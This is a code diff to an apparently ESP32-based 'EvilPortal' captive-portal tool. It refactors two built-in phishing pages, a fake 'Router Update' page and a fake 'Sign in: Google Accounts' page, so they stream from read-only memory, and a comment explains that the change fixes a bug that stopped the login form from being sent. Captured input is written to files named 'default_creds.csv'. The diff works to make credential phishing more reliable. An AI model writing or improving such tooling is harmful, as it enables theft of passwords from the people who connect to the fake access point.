@@ -571,7 +571,7 @@ String EvilPortal::wifiLoadPage() {
 }
 
 void EvilPortal::loadDefaultHtml_one() {
-    htmlPage =
+    static const char kRouterPage[] =
         "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
         "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
         "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza "
@@ -601,12 +601,14 @@ void EvilPortal::loadDefaultHtml_one() {
         "parseInt(document.getElementById('span-count').textContent)if (index > 1) "
         "{document.getElementById('span-count').textContent = index-1;index--;} else "
         "{document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>";
+    _defaultHtml = kRouterPage;
+    _defaultHtmlLen = sizeof(kRouterPage) - 1;
     outputFile = "default_creds_1.csv";
     isDefaultHtml = true;
 }
 
 void EvilPortal::loadDefaultHtml() {
-    htmlPage =
+    static const char kGooglePage[] =
         "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta "
         "name='viewport' content='width=device-width, initial-scale=1.0'><style>a:hover{text-decoration: "
         "underline;}body{font-family: Arial, sans-serif;align-items: center;justify-content: "
@@ -662,6 +664,8 @@ void EvilPortal::loadDefaultHtml() {
         "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
         "class='containerbtn'><button id=submitbtn class=submit-btn "
         "type=submit>Next</button></div></form></div></div></div></body></html>";
+    _defaultHtml = kGooglePage;
+    _defaultHtmlLen = sizeof(kGooglePage) - 1;
     outputFile = "default_creds.csv";
     isDefaultHtml = true;
 }
@@ -676,8 +680,18 @@ void EvilPortal::portalController(AsyncWebServerRequest *request) {
         return;
     }
     recordPageView();
-    if (isDefaultHtml) request->send(200, "text/html", htmlPage);
-    else { request->send(*fsHtmlFile, htmlFileName, "text/html"); }
+    if (isDefaultHtml) {
+        // send(200, "text/html", String) buffers the whole body in one AsyncBasicResponse
+        // copy and hands it to lwIP in a single write. At the ~16 KB the portal leaves
+        // free the fourth 1,436-byte segment fails to allocate, and the response stops
+        // dead at 3*MSS with the last 524 bytes — the login form — never sent (ISSUE-21).
+        // Streaming from .rodata drops both that copy and the per-write demand.
+        request->send(
+            request->beginResponse(200, "text/html", (const uint8_t *)_defaultHtml, _defaultHtmlLen)
+        );
+    } else {
+        request->send(*fsHtmlFile, htmlFileName, "text/html");
+    }
 }
 
 void EvilPortal::credsController(AsyncWebServerRequest *request) {
